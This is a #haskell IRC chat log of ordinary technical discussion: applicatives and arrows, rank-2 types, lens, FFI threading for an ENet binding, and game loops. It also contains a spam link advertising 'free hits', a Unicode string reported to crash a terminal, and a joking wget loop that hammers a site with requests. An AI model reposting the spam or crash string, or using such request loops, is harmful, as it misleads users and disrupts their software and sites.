13:43:21 <emiliano1> okay
13:43:34 <edwardk> i wouldn't worry about them. learn what you need of their combinators in passing as they are occasionally syntactically useful, but there isn't deep insight there
13:43:50 <emiliano1> okay that's the impression I got
13:43:52 <Rembane> edwardk: So arrows are older than applicatives?
13:43:56 <edwardk> Rembane: yeah
13:44:04 <ParahSailin> oh... that explains it
13:44:11 <lispy> The only place I can think of where applicative hasn't replaced arrows is arrowized FRP (applicative FRP still has lots of spae leaks?)
13:44:14 <edwardk> Rembane: interestingly applicatives spun out of work by sweirstra as well
13:44:19 <Rembane> edwardk: That's interesting, I thought they were new and cool. :)
13:44:26 <ParahSailin> how does arrowized frp work
13:44:54 <edwardk> lispy: the issue isn't the applicative frp, its the monadic frp you then want to bolt on top =)
13:45:08 <lispy> ParahSailin: the arrow is an abstraction over a stream of events. You can also have applicative streams.
13:46:58 <lispy> arrowized FRP is pretty much just like working in a monad over a stream except it's not a monad.
13:47:35 <lispy> The subtle difference is important for efficiency (and also theoretically makes sense) but I don't know how to explain it
13:47:45 * hackagebot BlogLiterately-diagrams 0.1.2.2 - Include images in blog posts with inline diagrams code  http://hackage.haskell.org/package/BlogLiterately-diagrams-0.1.2.2 (BrentYorgey)
13:48:11 <ystael> has anyone written a "manual of intermediate to advanced haskell type stuff" analogous to the role of "on lisp" for lisp macros?
13:49:37 <sm> have you seen http://www.haskell.org/haskellwiki/Typeclassopedia ?
13:50:02 <mcstar> thats what parents show bad kids
13:52:36 <ystael> sm: that may indeed be exactly what i am looking for, or an initial segment thereof
13:52:40 <ystael> thank you!
13:52:53 <sm> it is an important piece.. np
13:53:00 <lispy> ystael: http://www.icfpconference.org/history.html :)
13:53:07 <sm> as for macros, we have template haskell and it badly needs such a doc
13:53:42 <ystael> sm: i mentioned macros only to give an example of the point in one's education that one would read such a thing
13:53:59 <sm> lispy: you made me think of SPJ's history of haskell paper.. that's probably another of the top 10 docs
13:54:02 <lispy> ystael: I'm not 100% serious with that link, but a lot of the intermediate/advanced Haskell stuff gets a paper about it at some point
13:54:39 <ystael> lispy: yes, but that's why people like me beg other people to write expository books, so we don't have to read 15 years of literature to become fluent in the language :)
13:54:57 <haasn> edwardk: going through your thesis, in definition 2.4.1 you start talking about lines that stab through other lines; where is ‘stab’ defined? did I accidentally skip some page?
13:55:10 <sm> oh, multiple authors, excuse me. ystael: http://www.haskell.org/haskellwiki/History_of_Haskell . It actually helps a bit with understanding language concepts IIRC
13:56:18 <lispy> ystael: This is a favorite of mine: http://web.cecs.pdx.edu/~mpj/thih/ Follow along the development in the paper implementing it
13:56:32 <lispy> ystael: when you're done you'll have a really solid understanding of Haskell98's type system
13:57:50 <ystael> lispy: hm, that does look handy, thank you!
13:59:19 <lispy> ystael: another exercise is to try to implement peano arithmetic in the type system. You have Functional Dependencies and Type Families at your disposal and they give different looking solutions that work the same under the hood.
13:59:37 <lispy> Understanding that is quite illuminating, but I don't have a reference handy :(
14:00:32 <haasn> edwardk: oh, but from context it seems like it means ‘intersect’
14:00:56 <lispy> ystael: do you understand how to use rank-2 types like ST?
14:01:21 <ystael> lispy: not really yet
14:01:25 <lispy> ystael: that's a fairly important one to grasp. It's good to understand ST but also the technique can be used in lots of places.
14:01:50 <lispy> ystael: in that case, start with the typing haskell in haskell paper (it will give you a solid foundation) and then explore rank-2 types.
14:02:44 <lispy> From there you will want to look at (in no particular order, maybe even at the same time), existential types, GADTs, fun deps, and type families
14:03:55 <FreeFull> > (1,2) ^? (\f (a,b) -> fmap (const (a,b)) (f a))
14:03:56 <lambdabot>   Just 1
14:03:59 <FreeFull> What did I just do
14:04:28 <edwardk> haasn: colloquially it just means intersects
14:04:38 <lispy> :t (\f (a,b) -> fmap (const (a,b)) (f a))
14:04:38 <lambdabot> Functor f => (t -> f a) -> (t, t1) -> f (t, t1)
14:05:07 <FreeFull> type Getting r s a = (a -> Accessor r a) -> s -> Accessor r s
14:05:17 <mcstar> hm, how are rank 2 types different from rank 1 types, other than taking another type parameter?
14:06:07 <ystael> lispy: this is very helpful, thank you much!
14:07:42 <FreeFull> I think (\f (a,b) -> fmap (const (a,b)) (f a)) is close to how _1 is defined
14:07:51 <FreeFull> But I haven't looked at how _1 is defined, so I'm not sure
14:07:51 * hackagebot matchers 0.8.0.0 - Text matchers  http://hackage.haskell.org/package/matchers-0.8.0.0 (OmariNorman)
14:08:02 <lispy> mcstar: You can think of rank-2 and above as passing around a type scheme (something with a forall in it)
14:09:33 <lispy> id :: forall a. a -> a, lets the caller fix the a, but in foo :: (forall a. a -> a) -> b, the caller doesn't get to fix the a. The caller instead has the obligation of providing something that works at all a
14:09:53 <FreeFull> Oh, _1 is part of a typeclass
14:10:02 <FreeFull> To work with arbitrary tuples
14:10:29 <supki> FreeFull: fmap (const (a, b))  part does not seems right
14:10:30 <donri> not just tuples
14:10:39 <supki> you need to use the result of  f a
14:10:54 <supki> s/seems/seem/
14:10:57 <FreeFull> supki: It works with ^?
14:11:13 <FreeFull> And it was the only thing I could think of that would match the type
14:11:18 <supki> yeah, because ^? does not use it :)
14:11:20 <dwcook> @type _1
14:11:21 <lambdabot> (Functor f, Field1 s t a b, Indexable Int p) => p a (f b) -> s -> f t
14:11:27 <dwcook> o_0
14:11:31 <haasn> FreeFull: it doesn't match the type :)
14:11:41 <FreeFull> haasn: It does when used with ^? =P
14:11:43 <haasn> should be -> f (a, t1)
14:12:51 <FreeFull> ^? wants a  Getting (Data.Monoid.First a) (t, t1) a  on the right hand side
14:13:02 <mcstar> lispy: are you saying, the type of foo must be rank-2?
14:13:02 <supki> FreeFull: in other words you can get but not set with that definition
14:13:17 <FreeFull> supki: I know
14:14:03 <haasn> edwardk: how can two lines be skew if axiom 1^ says any two distinct lines are incident with one common point?
14:14:28 <FreeFull> Let me do the same thing again with .^ to figure out what the right _1 for two-tuples would be
14:14:40 <edwardk> haasn: in the projective plane they always intersect, but in a larger space they don't necessarily
14:14:41 <black_joe> So I am messing with Typeclasses for the first time, and I can't get this example working: http://lpaste.net/92292
14:14:42 <lispy> mcstar: yes, foo is rank-2 in that example because there is a forall on the left hand side of a function arrow
14:15:06 <FreeFull> ^. that is
14:15:07 <black_joe> I am basically trying to overload the function after, because it works differently on lists of informtation. Is this possible? And if it is, what's wrong with the code?
14:15:20 <edwardk> axiom 1^, and the like are to introduce the notion of duality of statements in the plane, iirc
14:15:31 <mcstar> lispy: so, that type cannot be handled in H98?
14:15:37 <lispy> mcstar: right
14:15:47 <edwardk> bbiab
14:15:51 <FreeFull> Actually I should just :info Lens
14:17:57 <mcstar> i think `after x c = sub x (pos x c)` in the class definition is not what you want
14:18:45 <black_joe> Why? ghc didn't say there was anything wrong with the function. Just that it was not a visible method.
14:18:58 <black_joe> And when it's outside of the class definition, it seems to work.
14:20:04 <mcstar> you need to supply types at least
14:20:21 <mcstar> how does `a` connect to `after`?
14:20:25 <joelteon> why doesn't hackage show my haddock docs?
14:20:30 <black_joe> Oh my god, you're right.
14:20:30 <joelteon> I definitely added docs
14:20:31 <black_joe> Sorry about that.
14:20:39 <black_joe> I goof'd the first one.
14:20:49 <black_joe> First one is supposed to be a list. Thanks.
14:21:09 <FreeFull> I guess I want something of the type  Lens (a,b) (a',b) a a'  right?
14:21:23 <mcstar> you can provide a default implementation in the class definition, but im not sure it would make much sense, idk
14:21:38 <mcstar> since the type would be too general
14:22:51 * hackagebot damnpacket 0.1.0.0 - Parsing dAmn packets  http://hackage.haskell.org/package/damnpacket-0.1.0.0 (JoelTaylor)
14:23:59 <monochrom> w00t, GHC has DeriveFunctor?! I have been handwriting Functor instances all day long for basic algebraic types like "data Joy a = Add a a | Neg a"...
14:26:02 <FreeFull> supki: \f (a,b) -> fmap (flip (,) b) (f a)    Does this look good?
14:27:22 <FreeFull> monochrom: I wonder how many ways there are to make any type into a valid functor
14:27:24 <joelteon> is there a wait before it builds documentation
14:27:30 <FreeFull> I guess DeriveFunctor will give you the free functor
14:28:33 <monochrom> to be fair, that's all I want anyway :)
14:28:36 <FreeFull> But I can't actually think of any functors where there is more than one way to implement them and satisfy the laws
14:29:10 <monochrom> it is not like I write "newtype Mu f a = Mu (f (Mu f a)) deriving Functor"
14:29:26 <shachaf> You should call that type Fix!
14:29:38 <sclv_> deriving foldable and traversable on the other hand can be done multiple ways typically :-(
14:29:46 <shachaf> Er, no. I didn't see the "a".
14:29:53 <sclv_> on the other hand, so can Eq and Ord, so... :-)
14:29:53 <monochrom> https://www.dropbox.com/s/4sferqlnqmfhg7g/nu.txt :)
14:30:14 <shachaf> I'm not sure what the a is for, actually...
14:30:34 <FreeFull> sclv_: I heard that every type that can be an applicative functor has two possible applicative functor instances
14:30:34 <monochrom> for kind inference :)
14:30:51 <FreeFull> I guess type isn't the right word
14:31:22 <FreeFull> But for example lists have a multiplicativey and a zippy instance
14:32:59 <FreeFull> Actually, that might not be true
14:33:07 <FreeFull> I can only think of one instance for Identity
14:34:59 <Eduard_Munteanu> How do you fit applications into the Haskell modules hierarchy? I think designing the application as a library and putting the specific stuff in a Main module seems cleanest.
14:36:09 <monochrom> yes
14:37:46 <sclv_> FreeFull: yeah, you can usually always go 'forward' and 'backward'
14:38:04 <sclv_> right -- in trivial cases like identity, you can't do that
14:38:15 <sclv_> b/c the different options converge
14:38:37 <scshunt> Eduard_Munteanu: depends on the application
14:40:34 <Eduard_Munteanu> scshunt: it's a gnupg frontend... I think I can put the parsing bits into Data.GnuPG for example.
14:53:50 <Laser2p0> Get free hits to your website, project, game, forum or blog.     join free all 100% free     http://www.te4everyone.com/index.php?ref=31
14:55:03 <mbrock> free hits is a shady proposal in pretty much any situation
14:56:09 <deech> Why is it that if I let the compiler infer a type I don't have to explicitly import any of the datatypes?
14:56:18 <tiffany> I'm amazed at how fast they were removed
14:56:35 <ion> while wget -O /dev/null http://mysite/; do :; done  # free hits for your website
14:56:57 <donri> deech: the types are still there, imports are just for getting a syntactical reference to something
14:57:00 <monochrom> because the need to import is based solely on the need to use names and instances
14:57:33 <deech> donri, monochrom: Ah. Thanks!
14:57:53 <monochrom> it is required by the Haskell Reports
14:58:25 <monochrom> something along the line of "the compiler has to figure out what other modules you need"
14:59:59 <monochrom> this is also why in *.cabal files you say which packages you need, not which modules you need. the compiler searches for modules from those packages
15:00:30 <deech> monochrom: That makes a lot of sense. I wondered about that.
15:01:18 <Kawata> سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ
15:01:39 <deech> So why isn't this taken further to funtions? Why do I have to explicitly import them even if there's no ambiguity?
15:02:03 <c_wraith> Because you want to refer to them by name.
15:02:26 <deech> c_wraith: Right. Of course.
15:02:44 <danilo2> Hi! could somebody help me with a type problem? I'm trying to write a code under monad stack and I'm getting an error when applying ((<*>)) applicative operator: http://lpaste.net/92294
15:03:49 <joelteon> that text keeps crashing iterm
15:04:07 <donri> deech: there's a flag (default in ghci) that makes every module known automatically imported qualified
15:04:30 <monochrom> SML goes further. there is no import command altogether. you can just write "ThatModule.joy". the compiler figures out you need ThatModule and transitively other modules required by joy
15:04:53 <donri> deech: but you'd probably tire quickly of typing Control.Monad.bla
15:05:26 <monochrom> there is an "open ThatModule" command, but all it does is giving you the joy of just saying "joy", it's just namespacing.
15:06:25 <erisco> if you defined an operator as flip (.), would infixl make more sense? the difference seems subtle to me
15:06:37 <monochrom> Haskell cannot go fully that route because of typeclass instances. so its "import" has to be a little bit more than namespacing.
15:06:39 <geekosaur> danilo2, MaybeT doesn;t have an Applicative instance. (we are not yet at the point where all Monad-s are Applicative-s)
15:06:54 <geekosaur> all monads are applicatives, but not all Monad-s are Applicative-s
15:07:00 <erisco> I understand infixr on $ so that it groups everything to the right, but it is precedence 0, so it will group a lot of things
15:07:06 <erisco> where as (.) is infixr 9
15:07:18 <danilo2> geekosaur: OK so I cannot use Applicative style with MaybeT?
15:07:35 <shachaf> (.) is associative so infixr/infixl doesn't matter unless you're using another operator with it.
15:07:42 <danilo2> geekosaur: Is there any way to do it ?
15:07:43 <geekosaur> not by default. you should be able to define an Applicative instance fairly easily, though
15:07:59 <joelteon> ok, my package still doesn't have docs on hackage
15:08:04 <joelteon> when is documentation generated?
15:08:09 <monochrom> erisco: if (.) is infixr, then flip (.) is infixl, I agree
15:08:19 <danilo2> geekosaur: Could you give me a hint how to do it? I dont think I can manage to do it alone right now :/
15:08:29 <donri> where are you getting Control.Monad.Maybe from
15:09:05 <danilo2> donri: MaybeT (this is the pacage name_
15:09:19 <donri> danilo2: use the one in transformers instead?
15:09:41 <Sonarpulse> is there a bound IO monad?
15:09:47 <Sonarpulse> something like ST s
15:09:59 <Sonarpulse> except IO with a phantom type
15:10:11 <monochrom> ah, transformers's MaybeT has Applicative instance
15:10:30 <monochrom> transformers comes with Haskell Platform!
15:10:38 <Sonarpulse> ^ cool!
15:10:55 <Sonarpulse> I am making bindings for a library with no concurrency support
15:11:06 <Sonarpulse> and I know there is foreign safe
15:11:27 <Sonarpulse> but I rather use phantom type for a compile-time instead of run-time check
15:11:30 <c_wraith> what degree of no concurrency support does the library have?
15:11:48 <danilo2> donri: It works!!! Thank you! I didn;t know that transformers have got MaybeT - Maybe we shoudl mark somehow MaybeT (package) as depreciated?
15:11:50 <Sonarpulse> it must be only used from one thread
15:12:02 <c_wraith> ah, the worst kind.
15:12:04 <Sonarpulse> but it can be used with unrelated things going on in other threads
15:12:11 <donri> Sonarpulse: http://blog.ezyang.com/2010/06/principles-of-ffi-api-design/
15:12:41 <Sonarpulse> I doubt it uses posix thread-local variables or anything like that
15:12:46 <erisco> hm, what might you do in Haskell if you need to define two functions available globally which need to share the same internal bits?
15:12:58 <erisco> presuming the internal bits are best not left to polluate the global space
15:13:09 <Sonarpulse> so you hypothetically do it one thread
15:13:13 <donri> erisco: module export list? :)
15:13:15 <Sonarpulse> kill that, and do it in another thread
15:13:22 <erisco> donri, I mean within the module too
15:13:47 <erisco> this is something you'd normally have in a 'let' or 'where'
15:14:21 <donri> erisco: well you *can* do (foo,bar) = (a,b) where common = ...; a = ...; b = ...
15:14:23 <erisco> I suppose you could return the two functions in a tuple and then unpack it
15:14:30 <donri> erisco: but not sure it's worth it
15:15:16 <erisco> donri, okay thanks
15:18:57 <erisco> blarg so much writing... don't recommend writing your paper at the last minute
15:19:39 <Sonarpulse> thanks donri, just finished reading it
15:19:41 <MedDev> erisco, procrastination is the best motivator though :)
15:20:18 * erisco can't tell if there is truth or just nonsense in that
15:20:27 <sm> MedDev: you mean, panic is :)
15:20:42 <MedDev> the result of procrastination*
15:20:47 * erisco understands now
15:21:21 <solirc> Somebody mentioned me in here, but there was so much talk in here that my client already discarded the history.
15:21:32 <solirc> So I can't read it anymore :(
15:21:44 <Tene> solirc: 21:10 < Fuuzetsu> tabemann: I think solirc is going to be attempting to hack  this into GHC in the near future but I don't know too much  about it.
15:21:54 <geekosaur> [29 04:10] <Fuuzetsu> tabemann: I think solirc is going to be attempting to hack this into GHC in the near future but I don't know too much about it.
15:21:58 <sm> never fear, it is enshrined at ircbrowse.com for ever
15:22:09 <Tene> solirc: 21:07 < tabemann> Cale: what we really need is a version of "error" that adds  line numbers and all to the exception text
15:22:22 * erisco remembers reading this hours ago
15:22:25 <Makoryu> Hey wait when did this channel break a thousand users
15:22:29 <Makoryu> On like a regular basis
15:22:36 <monochrom> a few months ago
15:22:53 * erisco when people figured out they could look cooler by idling in #haskell
15:24:05 <path[l]> lol, silly people. I realised that years ago
15:24:11 <monochrom> it is estimated that, by the year 2150, the participants of #haskell will be the major source of carbon dioxide emission
15:24:41 <ion> Does #haskell grow linearly or exponentially?
15:24:56 <arkeet> ion: logistically.
15:24:57 <donri> logarithmically, of course
15:25:02 <ParahSailin> sweet, now we can blow up all the memory on iOS
15:25:08 <geekosaur> many ages ago, I recall someone (dons?) doing a chart of #haskell growth...
15:25:33 <arkeet> as the channel grows too large, people die from overpopulation.
15:25:54 <monochrom> or carbon dioxide suffocation :)
15:26:16 <Rembane> Game of life @ #haskell?
15:26:30 <geekosaur> monochrom, more likely massive amounts of waste heat from monad tutorials :p
15:26:54 <monochrom> those two combined will be greenhousation
15:27:34 <monochrom> "before there was cosmo heat death, there was... #haskell heat death!"
15:28:18 <monochrom> anyway, Oleg's extensibe effects is really cool
15:29:49 <solirc> geekosaur, Tene: Thanks )
15:30:49 <Tene> np
15:32:23 <Sonarpulse> So if I have my ST style "locked monad"
15:32:39 <Sonarpulse> is there anyway to embed IO actions within it
15:33:24 <Sonarpulse> without subverting the guarantee that the FFI'd library is still run in one thread?
15:34:31 <donri> doubtful
15:34:32 <monochrom> if you allow some IO actions but disallow some others, you have to explicitly code up names and definitions for exactly the allowed ones
15:34:37 <shachaf> If you spread your question over multiple lines, you should at least make sure your phrasing is prefix-free.
15:35:36 <Sonarpulse> sorry
15:35:43 <Sonarpulse> the library is ENet, I might as well use that name for an example
15:35:51 <monochrom> example: my_putstrln msg = secret_converter (putStrLn msg). secret_converter is your internal thing, don't export it.
15:36:24 <Sonarpulse> but I'd like users to be able to stick in stuff too, if possible
15:36:44 <Sonarpulse> so I have runENet, analogous to runST
15:36:53 <Sonarpulse> with the rank-2 phantom type stuff
15:37:07 <donri> Sonarpulse: can't you just control access with an mvar
15:37:28 <Sonarpulse> well then I might as well be using foreign safe
15:37:39 <Sonarpulse> which I think does something like that under the hood
15:37:47 <monochrom> if you think in terms of "users be able to stick in stuff", you need to know: http://www.reddit.com/r/PHP/comments/1l7baq/creating_a_user_from_the_web_problem/
15:37:51 <donri> that's not my understanding
15:38:10 <donri> "foreign safe" doesn't magically make thread-unsafe foreign imports thread-safe
15:38:31 <startling> you might be able to do it with effects
15:40:21 <jmcarthur_mobile> Safe is as safe as the function you are binding. Unsafe is potentially *less* safe.
15:40:59 <jmcarthur_mobile> But it's really only worth thinking about when C can call back into Haskell
15:41:45 <Sonarpulse> I read http://www.vex.net/~trebla/haskell/ghc-conc-ffi.xhtml
15:43:12 <Sonarpulse> I am sure the library will not be calling back
15:43:43 <Sonarpulse> there is a mechanism to give it a function pointer for your own malloc and free, but I did not provide bindings for it
15:45:57 <jmcarthur_mobile> I guess the other time you care is when it's a blocking call.
15:46:16 <jmcarthur_mobile> Since and unsafe call blocks the entire capability until it's done
15:46:22 <jmcarthur_mobile> *an
15:46:39 <jmcarthur_mobile> Really the only reason to use an unsafe binding is for speed
15:48:06 <Sonarpulse> Well yes
15:48:23 <Sonarpulse> ENet is a networking library
15:48:37 <Sonarpulse> It precludes the use of Haskell's much better IO manager
15:49:01 <Sonarpulse> but is nessisary when you are trying to interface with a protocol made with ENet
15:49:23 <Sonarpulse> in the package notes I mention that for something entirely new, one shouldn't use enet
15:50:09 <Sonarpulse> As far as I can tell unsafe + boundthread is fine with regards to pre-emption
15:50:13 <haasn> complicate :: Complicated c => QuaternionBasis -> (c, c)Source
15:50:19 <Sonarpulse> as nothing else can happen there anyways
15:50:53 <jmcarthur_mobile> No
15:51:06 <jmcarthur_mobile> A bound thread does not have exclusive access to the capability
15:51:18 <Sonarpulse> ok
15:51:18 <jmcarthur_mobile> It's just guaranteed to not move to a different one.
15:53:14 <Sonarpulse> one sec
15:54:06 <c_wraith> Is it even guaranteed not to be migrated to another capability?  I thought the only guarantee was the safe foreign calls would always be made from the same OS thread, which doesn't depend on the same capability.
15:54:21 <jmcarthur_mobile> Ah that may be correct
15:54:47 <jmcarthur_mobile> For my purposes it has always been sufficient to assume that it just never switches capabilities at all.
15:55:00 <jmcarthur_mobile> But what you say sounds right.
15:57:22 <Sonarpulse> "it's just guaranteed to not move to a different one." you were talking about bound threads, not safe foreign calls, right?
15:57:42 <jmcarthur_mobile> But wait, that would mean unsafe calls don't get that guarantee. Maybe I'm mistaken, but I thought OpenGLRaw used unsafe calls, which if this is correct would be troublesome since opengl needs to generally run in the same thread all the time.
15:58:02 <jmcarthur_mobile> I don't have the bandwidth and time too it up right now.
15:58:13 <Sonarpulse> as far as I can tell, unsafe and bound thread do tend to go together
15:59:09 <c_wraith> If bound threads do work for unsafe calls, they have to actually be handed the capability while they run native code.  Which isn't impossible, but it it is interesting.
15:59:19 <c_wraith> err, while they run *haskell* code
15:59:36 <jmcarthur_mobile> Oh, OpenGLRaw must be using dynamic calls (not all bindings are known statically) , so I don't know what that means.
16:00:46 <Sonarpulse> I think the some of the literature on GHC threading uses capability to refer to OS thread, not CPU/core
16:00:51 <jmcarthur_mobile> It is indeed unsafe, but more complicated than normal bindings
16:01:15 <jmcarthur_mobile> Sonarpulse: there are some little assumptions made here and there
16:01:44 <Sonarpulse> Well anways ENet is for very old-school, single-threading game networking
16:01:51 <jmcarthur_mobile> But a capability to is not just one os thread
16:02:11 <jmcarthur_mobile> It has a thread pool
16:02:37 <Sonarpulse> does windows and *nix migrate OS threads between cores? does it matter?
16:03:02 <jmcarthur_mobile> They do and it can matter but is hard to do anything special for
16:03:12 <Sonarpulse> OK
16:03:36 <jmcarthur_mobile> There are ways to pin threads to a core, but you don't generally want that
16:03:43 <Sonarpulse> OK
16:04:03 <Sonarpulse> ENet I think just has some globabl state, or maybe just a lack of locks or anything else on it's data strucutres
16:04:20 <Sonarpulse> so is long as you never call enet routines concurrently, I think you are OK
16:04:39 <Sonarpulse> doesn't matter what thread, or what core. ENet just simply has no support for concurrency
16:04:54 <Sonarpulse> Like I said, you are supposed to use it in your "main event loop" or whatever
16:04:59 <jmcarthur_mobile> I hate libraries with global state. It's... Okay for programs, but stupid for libraries :(
16:05:16 <Sonarpulse> Well, like I said, I don't advocate ENet for anything new
16:05:26 <Sonarpulse> I just need to use it for my client cause the server uses it
16:05:35 <startling> jmcarthur_mobile: especially, like, stdio
16:05:38 <jmcarthur_mobile> g2g
16:05:42 <Sonarpulse> ok
16:05:43 <Sonarpulse> thanks
16:06:39 <Sonarpulse> realistically though, while a server maybe able to handle many clients concurrently
16:07:35 <Sonarpulse> a game client is A) only connected to one server, and B) probably isn't doing that much parallizable anyways
16:08:18 <Sonarpulse> So even with Haskell and Greenthreads, if you are stuck with ENet it is probably better to confine it to one bounded thread
16:08:55 <Sonarpulse> But you want that networking loop to be fast, so unsafe, no mvars, etc is probably better
16:10:20 <Makoryu> https://gist.github.com/malleusinferni/6384416 <- Hey, is this a completely reprehensible or only mildly reprehensible abuse of the parser and stuff
16:11:34 <Makoryu> (Obviously there's some work to be done on the actual error handling seeing as it carries all those messages around and then gives up and bails out at the end)
16:17:54 * hackagebot haskell-names 0.1.2 - Name resolution library for Haskell  http://hackage.haskell.org/package/haskell-names-0.1.2 (RomanCheplyaka)
16:23:06 <mescalinum> delete x [] = []
16:23:08 <mescalinum> delete x (x:xs) = xs
16:23:09 <mescalinum> delete x (_:xs) = delete x xs
16:23:22 <mescalinum> how to make the last two patterns not overlapping?
16:24:01 <mescalinum> actually, the error is Conflicting definitions for `x'
16:24:04 <[swift]> mescalinum: you could use a guard
16:24:05 <ion> That’s the wrong question. The second pattern won’t do what you expect.
16:24:14 <Rarrikins> mescalinum: delete x (y:ys) = if x == y then ... else ...
16:24:23 <MedDev> mescalinum, you have two arguments named x is what that error means
16:24:28 <ion> delete x (y:ys) | x == y = … | otherwise = …
16:24:30 <thoughtpolice> mescalinum: that attempts to bind 'x' twice, so it is an error, you can instead say:
16:24:34 <thoughtpolice> delete x [] = []
16:24:46 <mescalinum> ah! I thought pattern matching works like unification
16:24:48 <thoughtpolice> delete v (x:xs) | v == x = xs
16:24:55 <thoughtpolice>            | otherwise = delete v xs
16:24:55 <[swift]> mescalinum: i wish!
16:25:11 <thoughtpolice> (with non-fubar'd indentation, ofc)
16:25:33 <ion> mescalinum: Incidentally, in Erlang a pattern like that *would* do what you expected.
16:25:52 <mescalinum> =)
16:26:41 <fylwind> this is probably something dumb, but I copied the example in section 3 of http://www.haskell.org/haskellwiki/GHC/Using_the_FFI#Callbacks_into_Haskell_from_foreign_code
16:26:53 <fylwind> and I get several errors similar to: Unacceptable argument type in foreign declaration: CDouble
16:28:21 <lispy> fylwind: Did you import Foreign.Types (or whatever module has CDouble) ?
16:28:26 <lispy> @hoogle CDouble
16:28:27 <lambdabot> Foreign.C.Types data CDouble
16:28:32 <lispy> ah, Foreign.C.Types
16:28:42 <fylwind> yeah it's in the example code too
16:29:22 <thoughtpolice> fylwind: you also need to import the underlying type for CDouble, because it is a newtype
16:29:28 <thoughtpolice> change: import Foreign.C.Types(CDouble)
16:29:31 <thoughtpolice> to: import Foreign.C.Types(CDouble(..))
16:29:33 <thoughtpolice> and it will work
16:29:55 <fylwind> ah that worked, thanks; I guess I'll correct the wiki too
16:29:56 <thoughtpolice> this is a behavioral change in GHC (which happened for generally fiddly reasons IIRC)
16:30:07 <thoughtpolice> fylwind: please do, thanks. the change is obv backwards compat
16:31:21 <fylwind> or I guess creating an account is a little more complex
16:31:48 <lispy> I think you only need the account if you want to post URLS
16:32:00 <lispy> I believe anyone can make plain text edits
16:32:26 <fylwind> unfortunately "You do not have permission to edit this page,"
16:34:01 <lispy> fylwind: I updated it
16:34:23 <fylwind> ah alright, thanks
16:36:32 <FreeFull> What's the current state of the art with FRP?
16:40:32 <lispy> elm :)
16:40:54 <lispy> FreeFull: Do you want a state of the art library or do you want the state of the art in terms of the research?
16:41:16 <FreeFull> I just want to see what's the best currently possible
16:41:17 <lispy> If you don't mind using not-Haskell: http://elm-lang.org/
16:41:39 <FreeFull> I don't like web stuff
16:41:46 <lispy> FreeFull: the research is trending more towards new things like functional hybrid modeling (I think I got the name rigth)
16:42:16 <Denommus> hi
16:42:30 <lispy> In terms of libraries that people are talking about I hear good things about both netwire and elerea
16:42:35 <Denommus> does anyone have an open source game written in Haskell that I can check?
16:42:47 <Denommus> I found some in github, but aparently I can't compile them
16:42:54 <lispy> FreeFull: but I haven't used either one. I found that yampa worked okay until my network had dynamic stuff and then my brain exploded
16:43:02 <Rarrikins> Denommus: Are you using GHC?
16:43:09 <Denommus> Rarrikins: yes
16:43:15 <Rarrikins> Denommus: What's the error?
16:43:25 <Denommus> one moment
16:43:26 <lispy> Denommus: someone I work with wrote tihs: https://github.com/glguy/Ninjas
16:43:39 <pentace> Denommus: http://www.haskell.org/haskellwiki/Frag
16:43:58 <lispy> frag isn't particularly playable
16:44:12 <pentace> Oh, why not?
16:44:15 <lispy> you can start it up and run around but there doesn't seem to be much of a game to it
16:44:17 <deech> Hi all, what's the etiquette with using Haskell libraries in my Setup.hs file? Is using things that come with Platform generally safe?
16:45:18 <lispy> Denommus: I made a pong clone: https://github.com/dagit/1GAM/tree/master/pong/yampa
16:45:21 <Rarrikins> deech: I don't know the etiquette exactly, but anything that's on cabal should be OK.
16:45:27 <sm> Denommus: there are many on hackage. The FunGEn and Helm game engines come with some small ones
16:45:29 <lispy> Denommus: you might also want to ask in #haskell-game
16:45:56 <Denommus> ok
16:46:16 <lispy> deech: I think the biggest problem with putting things in Setup.hs is that you have no way to tell cabal what versions of those things you need. You just get whatever is installed :(
16:46:55 <deech> lispy: Yeah. Unfortunately I have no choice. I need to filter directory contents and what I want is in filepath.
16:46:58 <jfischoff> it also interacts with sandboxing poorly, in the sense that it doesn't use the sandbox
16:47:20 <lispy> jfischoff: yeah, that's really frustrating
16:47:30 * jfischoff nods
16:48:03 <FreeFull> Denommus: https://github.com/pedromartins/cuboid  This compiles and runs fine for me, but  it is extremely simple and only has three levels
16:48:22 <Denommus> I'll check
16:48:35 <Denommus> I want to mostly understand how to do a game loop using only immutable data
16:48:47 <deech> jfischoff, lispy
16:48:51 <deech> jfischoff, lispy: Thanks!
16:49:04 <jfischoff> deech: hey man what are you working on?
16:49:34 <deech> A GUI binding: http://github.com/deech/fltkc
16:49:36 <sm> Denommus: in games, the state is mutable, so the State monad or IORefs are used
16:49:42 <MedDev> Denommus, https://github.com/klrr/pong another, simpler, game
16:49:56 <deech> jfischoff: Mostly done with the c bits. Now working on the Haskell parts.
16:50:01 <jfischoff> deech: nice
16:50:14 <FreeFull> I'm gong to check netwire out
16:50:42 <Denommus> sm: I was watching Carmack's presentation about functional programming for games, and I was interested in his approach for game loops, but I'm finding myself unable to implement it myself
16:50:47 <Denommus> so... that's why I'm asking
16:50:59 <Makoryu> What was his approach? I still haven't seen the talk
16:51:02 <MedDev> Denommus, check out Gloss and gloss-examples (on hackage) too
16:51:22 <Fuuzetsu> He doesn't talk about what he's using I believe.
16:51:56 <FreeFull> The simplest possible thing you can do in a game loop to pass the mutable state is to have it as an argument
16:52:03 <FreeFull> Or you could use a monad to wrap it up
16:52:22 <blackdog> Denommus: there are a few ways of doing it with FRP etc, but one way of thinking about it is a function step :: GameWorld -> (TimeDelta, Maybe PlayerInput) -> GameWorld
16:52:37 <erisco> hrm... inline in a sentence, is (id) a good way to refer to the function (id)?
16:52:54 <blackdog> it looks really wasteful, but if you're using non-ephemeral data structures, most of the GameWorld will probably be the same as the last one.
16:52:54 <erisco> in other languages you'd get by with id()
16:53:21 <Rarrikins> erisco: id in fixed-width font.
16:53:23 <MedDev> Denommus, what blackdog outlined is the basis for what the gloss package does with its Simulate and/or Game module
16:53:35 <erisco> Rarrikins, it looks rather subtle that way, though
16:53:47 <erisco> Rarrikins, without some kind of delimiter
16:53:50 <FreeFull> erisco: You can also give it a different background colour
16:54:09 <Denommus> ... cabal is difficult to use, damn
16:54:17 <FreeFull> erisco: And a border
16:54:36 <erisco> FreeFull, well that seems a bit overkill at the same time :P
16:54:53 <FreeFull> erisco: https://www.fpcomplete.com/user/tel/lens-aeson-traversals-prisms   I think the way it's done here looks good
16:55:23 <erisco> FreeFull, this is for black and white print. Not sure about that
16:55:30 <MedDev> Denommus, let us know the trouble and we'll help.  often the problem is a missing *-devel package
16:55:35 <FreeFull> erisco: Hmm
16:55:48 <shachaf> A prism isn't the same thing as an affine traversal. :-(
